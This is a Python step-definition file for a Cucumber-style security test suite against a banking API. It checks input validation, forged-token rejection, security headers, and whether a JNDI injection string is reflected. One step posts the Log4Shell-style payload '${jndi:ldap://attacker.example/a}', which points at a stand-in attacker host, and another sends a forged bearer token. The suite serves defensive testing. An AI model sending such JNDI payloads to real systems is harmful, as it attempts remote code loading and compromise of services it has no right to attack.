"""Step definitions for the Java platform Cucumber suite.

Defensive by design: any HTTP response counts as "reachable", and each step
records the last response on the behave context so assertions are deterministic
against either the real banking service or a stand-in. Reads the base URL from
TARGET_API_URL (injected by the AQE script runner)."""
import os

import requests
from behave import given, when, then

BASE = os.environ.get("TARGET_API_URL", "http://127.0.0.1:8000").rstrip("/")
LIMIT_PATH = os.environ.get("JAVA_LIMIT_PATH", "/api/v1/credit-cards/limit-increase")
PROTECTED_PATH = os.environ.get("JAVA_PROTECTED_PATH", "/api/v1/accounts")
TIMEOUT = float(os.environ.get("JAVA_HTTP_TIMEOUT", "10"))


def _safe(method, path, **kw):
    try:
        return requests.request(method, f"{BASE}{path}", timeout=TIMEOUT, **kw)
    except Exception as exc:  # noqa: BLE001
        return type("R", (), {"status_code": 0, "text": f"connection error: {exc}", "headers": {}})()


@given("the platform service is reachable")
def step_reachable(context):
    r = _safe("GET", "/health")
    if getattr(r, "status_code", 0) == 0:
        r = _safe("GET", "/")
    assert getattr(r, "status_code", 0) != 0, f"platform service not reachable at {BASE}"
    context.base = BASE


@when('I request a credit limit increase with delta {delta:d}')
def step_limit(context, delta):
    context.resp = _safe("POST", LIMIT_PATH, json={"delta": delta})


@then("the response is a client error")
def step_client_error(context):
    sc = context.resp.status_code
    assert 400 <= sc < 500, f"expected a 4xx client error, got {sc} (negative/invalid input was not rejected)"


@then("the response is successful")
def step_success(context):
    sc = context.resp.status_code
    assert 200 <= sc < 300, f"expected a 2xx success, got {sc}"


@when("I call a protected endpoint with a forged bearer token")
def step_forged(context):
    context.resp = _safe("GET", PROTECTED_PATH, headers={"Authorization": "Bearer forged.invalid.token"})


@then("the response is unauthorized")
def step_unauth(context):
    sc = context.resp.status_code
    assert sc in (401, 403), f"expected 401/403 for a forged token, got {sc} (auth not enforced)"


@when("I submit a JNDI lookup payload in a request field")
def step_jndi(context):
    payload = "${jndi:ldap://attacker.example/a}"
    context.jndi = payload
    context.resp = _safe("POST", LIMIT_PATH, json={"note": payload, "delta": 1})


@then("the payload is not reflected and no server error occurs")
def step_jndi_check(context):
    body = getattr(context.resp, "text", "") or ""
    sc = context.resp.status_code
    assert "jndi:" not in body, "JNDI payload was reflected in the response — injection guard missing"
    assert sc != 500, "server raised a 500 on the JNDI payload — possible evaluation/instability"


@then('the response includes the security header "{header}"')
def step_header(context, header):
    r = _safe("GET", "/health")
    if getattr(r, "status_code", 0) == 0:
        r = _safe("GET", "/")
    headers = {k.lower(): v for k, v in dict(getattr(r, "headers", {})).items()}
    assert header.lower() in headers, f"missing security header '{header}'"
